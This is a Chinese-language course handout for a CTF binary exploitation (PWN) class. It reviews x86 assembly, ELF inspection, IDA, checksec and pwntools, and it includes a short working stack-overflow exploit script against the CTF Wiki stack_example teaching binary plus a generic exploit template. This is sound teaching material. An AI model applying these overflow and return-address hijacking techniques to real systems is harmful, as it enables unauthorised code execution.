# 第1周 PWN 基线回顾与 pwntools 实战环境

> 主讲：王晨阳 | 分享周第 1 周（实际第 6 周）| 标本：stack_example（CTF Wiki 栈溢出入门）

解剖标本：stack_example（CTF Wiki 栈溢出入门示例）
一、PWN 与二进制漏洞利用简介
1.1 什么是 PWN
PWN 是 CTF 竞赛中二进制漏洞利用方向的名称，词源是 own 的拼写变体，意思是“攻破、拿下”。
它研究的不是“怎么发现漏洞”，而是“如何利用程序自身的缺陷，让它执行我们指定的代码，而不是它原本要执行的代码”。利用到手的标志通常是拿到一个 shell，然后读出服务器上的 flag 文件。
1.2 一次利用的三个组成部分
可控点
程序里能被我们写入数据的地方。典型是 gets、read、strcpy 这类不检查长度的函数。
目标
我们想让程序去的地方。可以是程序自带却从未被调用的函数，可以是 libc 里的 system，也可以是我们自己写入的 shellcode。
连接
用偏移量算出可控点到目标的距离，再把目标地址按正确的字节序拼进 payload 发过去。本讲后面算出来的 0x18 就是这一步要用的数字。
1.3 C 语言常见漏洞类型
漏洞类型
成因
典型后果
栈溢出
向栈上的缓冲区写入超过其长度的数据
覆盖返回地址，劫持控制流
堆漏洞
malloc / free 使用不当（UAF、double free、off-by-one）
改写堆元数据，实现任意地址写
格式化字符串
printf(s) 直接把用户输入当作格式串
任意读（泄露地址）、任意写
这些漏洞有一个共同的根源：C 语言不替程序员做检查——数组不检查长度、指针不验证有效性、printf 不检查格式串的来源。
1.4 x86 汇编基础
下面只列读二进制时真正会用到的部分。2025 学年已经学过 x86 汇编，这里做一次收口回顾，重点放在“看反汇编时哪些东西必须认得出来”。
寄存器
32 位
64 位
在 PWN 里的作用
eax
rax
函数返回值；32 位下还用来放系统调用号
ebx / ecx / edx
rbx / rcx / rdx
通用寄存器；也参与传参
esi / edi
rsi / rdi
通用寄存器；64 位下 rdi、rsi 是前两个参数
ebp
rbp
栈帧基准指针，局部变量都靠它定位
esp
rsp
栈顶指针，push / pop 改的就是它
eip
rip
下一条要执行的指令地址——劫持控制流改的就是它
—
r8 – r15
64 位新增；第 5、6 个参数用 r8、r9
常用指令
指令
后面跟什么
例子
说明
mov
两个：目标 , 源
mov eax, 0x10
把源放进目标，就是赋值
lea
两个：目标 , [地址表达式]
lea eax, [ebp-0x14]
把方括号里算出来的地址放进目标，不读内存
push / pop
一个
push eax
push 把值压栈，esp 减 4；pop 反过来，esp 加 4
sub
两个：目标 , 源
sub esp, 0x18
目标 = 目标 － 源。sub esp, N 就是给局部变量腾出 N 字节空间（帧大小由此而来）
add
两个：目标 , 源
add esp, 0x10
目标 = 目标 ＋ 源。add esp, N 就是回收刚才腾出的空间，与 sub 成对出现
call
一个：目标地址
call 0x8048300
先把下一条指令的地址压栈，再跳过去
ret
不跟操作数
ret
从栈顶弹出 4 字节当作地址跳过去
leave
不跟操作数
leave
等于 mov esp, ebp 再 pop ebp
jmp / je / jne
一个：目标地址
jmp 0x8048500
jmp 无条件跳；je / jne 看上一次比较的结果
cmp / test
两个：目标 , 源
cmp eax, 0x10
只改标志位，不保存结果；后面接条件跳转
函数序言与尾声
; ---- 函数序言 ----push ebp            ; 保存调用者的 ebpmov  ebp, esp       ; 建立自己的栈帧sub  esp, 0x18      ; 给局部变量腾出空间; ---- 函数体 ----...; ---- 函数尾声 ----leave               ; 等价于 mov esp, ebp 再 pop ebpret                 ; 从栈上弹出返回地址并跳过去
这段序言与尾声是所有栈溢出题的共同背景：ebp 上面就是返回地址，而 gets 这类函数会把数据一直写到那里去。
二、标本档案
2.1 文件信息
项目
内容
文件名
stack_example
大小
7,440 字节
类型
ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV)
链接方式
dynamically linked，interpreter /lib/ld-linux.so.2
符号表
not stripped（保留了函数名，IDA 里能直接看到函数名）
源码
stack_example.c，13 行，共 3 个函数
2.2 源码
#include &lt;stdio.h&gt;#include &lt;string.h&gt;void success() { puts(&quot;You Hava already controlled it.&quot;); }void vulnerable() {  char s[20];  gets(s);  puts(s);  return;}int main(int argc, char **argv) {  vulnerable();  return 0;}
2.3 关键地址
函数
地址
success
0x0804843b
vulnerable
0x08048454
main
0x0804847b
2.4 保护机制
保护
状态
Canary
关闭
NX
开启
PIE
关闭
RELRO
Partial
2.5 栈偏移
vulnerable 的反汇编：
08048454 &lt;vulnerable&gt;: 8048454:  pushl   %ebp 8048455:  movl    %esp, %ebp 8048457:  subl    $0x18, %esp 804845d:  leal    -0x14(%ebp), %eax     &lt;-- s 在 ebp-0x14 8048460:  pushl   %eax 8048461:  calll   0x8048300 &lt;gets@plt&gt; 804846c:  leal    -0x14(%ebp), %eax 8048470:  calll   0x8048310 &lt;puts@plt&gt; 804847a:  retl
偏移推导：反汇编给出的是 ebp-0x14（20 字节）。因此：
填充 s 的栈槽：0x14 = 20 字节
覆盖 saved ebp：4 字节
到达返回地址：0x14 + 4 = 0x18（24）字节
三、讲授流程
第 1 幕 · file 一眼定类型
操作
chmod +x stack_example
（在浏览器下载时有的文件可能自带权限，若没有权限运行命令时会显示Permission denied）file stack_example
输出
ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamicallylinked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, not stripped
要点（把输出拆成四个信息）
32-bit LSB —— 32 位、小端序
举例子：数字  0x12345678 （4字节，32位地址）
这个数字拆成4个字节： 0x12   0x34   0x56   0x78 
高位字节： 0x12 
低位字节： 0x78 
小端序 Little-Endian(LSB)，低位字节放低地址，高位字节放高地址
内存从低地址→高地址依次存： 78 56 34 12 
p32(0x12345678)
# 输出 b'\x78\x56\x34\x12'
大端序 Big-Endian(MSB)，高位字节放低地址，低位字节放高地址
内存从低地址→高地址依次存： 12 34 56 78 
Intel 80386 —— x86 架构
dynamically linked + interpreter /lib/ld-linux.so.2 —— 动态链接，运行时需要 Linux 的动态加载器
not stripped —— 保留了符号表，IDA 里能看到 success、vulnerable 这样的函数名；如果 stripped，就只能看到 sub_8048454 这类自动命名
第 2 幕 · 32 位与 64 位对比
对比表
判断手段
32 位
64 位
file 命令
ELF 32-bit LSB executable, Intel 80386
ELF 64-bit LSB executable, x86-64
checksec 的 Arch 行
i386-32-little
amd64-64-little
动态加载器
/lib/ld-linux.so.2
/lib64/ld-linux-x86-64.so.2
寄存器名（反汇编里）
eax / ebx / ecx / edx / esi / edi / ebp / esp
rax / rbx / … / rbp / rsp，另有 r8–r15
地址长度
8 位十六进制（0x0804843b）
12 位以上（如 0x00004005b6）
这两种位数在做题中的区别
做题环节
32 位
64 位
在哪类题目用到
偏移与打包
p32，返回地址占 4 字节
p64，返回地址占 8 字节；同样位置偏移多 4
所有栈溢出题
地址里的 0x00
没有，不怕 strcpy 截断
高位带 0x00，遇 strcpy / strcat 会被截断
溢出点是 strcpy / strcat 的题
调函数传参
参数直接摆在栈上
要先用 pop rdi; ret 把参数送进寄存器
ret2libc
传 3 个以上参数
直接摆在栈上就行
gadget 不够 → 要用 ret2csu
要调多参数函数（如 read / write）的题；ret2csu
调用 system
直接调
可能要先解决 16 字节栈对齐，插一个 ret
ret2libc 里调 system(&quot;/bin/sh&quot;)
shellcode
int 0x80，execve 调用号 11
syscall，execve 调用号 59
ret2shellcode
收尾一句：位宽决定了后面 payload 用 p32 还是 p64、ROP 怎么传参。这是贯穿全学期的分水岭。
第 3 幕 · IDA 分析
3.1 上半 · 读程序逻辑
动作
操作
反编译
F5
汇编 / 伪代码互切
Tab
双击跳转/return
双击函数名 / 按回车
交叉引用
反汇编窗口按 X
分析路径
从 main 开始，F5 出伪代码
看到 main 调用 vulnerable()，双击跟进
跟进后发现 gets(s) —— 无长度限制的输入
Shift+F3 打开函数列表，确认全程序只有 3 个自定义函数
回到 success()，按 X 查交叉引用 —— 结果是没有任何调用者
两个事实一碰：gets 可以溢出 + success 没人调用 → 题目意图就出来了
3.2 下半 · 看文件结构（8 分钟）
看什么
IDA 入口
讲解点
段（即节表）
Shift + F7
窗口里有 R/W/X 列和 Class 列（CODE / DATA / BSS）
导入表（即 GOT）
View → Open subviews → Imports
直接列出 gets / puts / __libc_start_main 及所属 libc，对应 PE 的 IAT
字符串
Shift + F12
直接看到 “You Hava already controlled it.”
栈变量
Ctrl + K
直接看到 s 在 ebp-0x14，查看栈偏移
第 4 幕 · checksec 与保护机制（10 分钟）
操作
checksec ./stack_example
保护
实测
意味着什么
Canary
关闭
溢出能直接盖到返回地址，这是本题能做的前提
NX
开启
栈不可执行，不能把 shellcode 写在栈上运行
PIE
关闭
加载基址固定，success 的地址可以硬编码
RELRO
Partial
重定位只读，.got 只读、.got.plt 可写
Stripped
关闭
保留了符号表，IDA 里能直接看到 success / vulnerable 等函数名
第 5 幕 · pwntools 与 exp 编写（12 分钟）
5.1 安装 pwntools
pwntools 是一个 Python 库，装它只要一条命令。建议装在 Linux 环境里（Kali / Ubuntu），因为后面要跑的题目都是 Linux 程序。
pip3 install pwntools# 国内下载慢就换清华源pip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple pwntools# 验证是否装好python3 -c &quot;from pwn import *; print(version)&quot;
两个附带好处：装 pwntools 会一并装上前面第 4 幕用的 checksec 命令；如果报 command not found: pip3，先补装 python3-pip 即可。
5.2 常用命令
分类
命令
作用
设置
context(arch=, log_level=)
设置架构与日志；log_level='debug' 能看到收发字节
打包
p32(x) / p64(x)
把整数打包成 4 / 8 字节（小端）；p32(0x0804843b) → b';\x84\x04\x08'
u32(b) / u64(b)
解包：u32(b'ABCD') → 0x44434241
连接
process('./pwn')
本地运行
remote('ip', port)
连接远程靶机
gdb.debug() / gdb.attach()
带 gdb 启动 / 附加到正在运行的进程
接收
recvuntil(b'提示')
一直收到指定内容为止（最常用）
recvline()
收一行
recv(n)
收 n 个字节
发送
send(b'x')
发送，不补换行
sendline(b'x')
发送并补一个换行
sendlineafter(b'提示', b'x')
收到提示再发，等价于 recvuntil + sendline
交互
interactive()
把控制台交还给你
ELF
ELF('./pwn')
加载二进制；用 elf.symbols / elf.plt / elf.got 取地址
生成 shellcode
shellcraft.sh() / asm()
生成并汇编 shellcode，直接写进 payload
搜 gadget
ROP(elf)
自动搜索 ROP gadget，拼接利用链
5.3 exp.py
#!/usr/bin/env python3from pwn import *           #导入pwntools全部工具context(os='linux', arch='i386', log_level='debug')         #设置环境elf = ELF('./stack_example')                    #加载目标程序success_addr = elf.symbols['success']      # 0x0804843b，获取success函数地址io = process('./stack_example')    #本地连接
#io = remote(‘host’,port)               远程连接payload  = b'a' * 0x14        # 填满 s 的栈槽（s[20] = 0x14 字节）payload += b'b' * 0x04        # 覆盖 saved ebppayload += p32(success_addr)  # 覆盖返回地址 -&gt; success()io.sendline(payload)io.interactive()
逐行讲解
行
讲什么
context
arch 决定 p32/p64；log_level='debug' 能看到收发字节，新手建议默认开着
ELF()
用 elf.symbols 取地址；后续 elf.plt / elf.got 也用得上
process()
本地运行；换 remote('host', port) 就能打远程，其余代码不动
payload
偏移必须从反汇编量；b 前缀是 Python 3 的硬要求
interactive()
拿到 shell 后交还终端
成功的标志：屏幕上出现 “You Hava already controlled it.”
四、附录
附录 A · ELF 与 PE 格式对照
对比项
ELF（Linux）
PE（Windows）
魔数
0x7F 'E' 'L' 'F'
'M' 'Z'
文件头
ELF Header
DOS Header + NT Header
段/节描述
Section Header Table
Section Table
导入表
.plt + .got（延迟绑定）
IAT（导入地址表）
动态加载器
/lib/ld-linux.so.2 或 /lib64/ld-linux-x86-64.so.2
ntdll.dll / kernel32.dll
字符串表
.dynstr / .strtab
.rdata
查看工具
file、readelf、objdump、IDA
PEiD、DIE、IDA
附录 B · IDA 9.3 快捷键速查
做什么
快捷键
反编译出伪代码
F5
汇编 / 伪代码互切
Tab
图形 / 线性视图互切
Space
看段（即节表）
Shift + F7
看导入表（即 GOT / IAT）
View → Open subviews → Imports（无快捷键）
看字符串
Shift + F12
看函数列表
Shift + F3
看名字列表
Shift + F4
看当前函数栈变量
Ctrl + K
查交叉引用
在反汇编窗口按 X
交叉引用树
Shift + X
重命名
N
版本提醒：从 IDA 9.0 起，Structures 和 Enums 窗口已被移除、合并进 Local Types。不要按老教程去找“结构体窗口”。
附录 C · exp 模板
#!/usr/bin/env python3from pwn import *# ---- 1. 全局设置 ----context(os='linux', arch='amd64', log_level='info')# 32 位题目：arch='i386'      想看收发字节：log_level='debug'BIN = './pwn'elf = ELF(BIN)elf.checksec()# ---- 2. 连接：本地 / gdb / 远程，只改这一段 ----def start():    if args.REMOTE:        return remote('target.host', 10001)    if args.GDB:        return gdb.debug(BIN, gdbscript='b *main')    return process(BIN)io = start()# ---- 3. 交互：对齐 -&gt; 发送 ----# io.recvuntil(b'prompt')# io.sendline(payload)io.interactive()
附录 D · 常见坑清单
现象
真正原因
怎么办
类型报错、收发失败
Python 3 下 pwntools 只认 bytes
所有字符串加 b 前缀
发完 payload 没反应
用了 send，但程序在等换行
换 sendline，或手动补换行符
本地通、远程不通
远程 libc 不同，或附件与远程不是同一份
patchelf 换 libc，或从泄露地址反推版本
64 位莫名跳到怪地址
栈 16 字节对齐没满足
payload 里插一个 ret gadget（第 3 周讲）
process() 权限拒绝
附件没有执行权限
chmod +x ./pwn
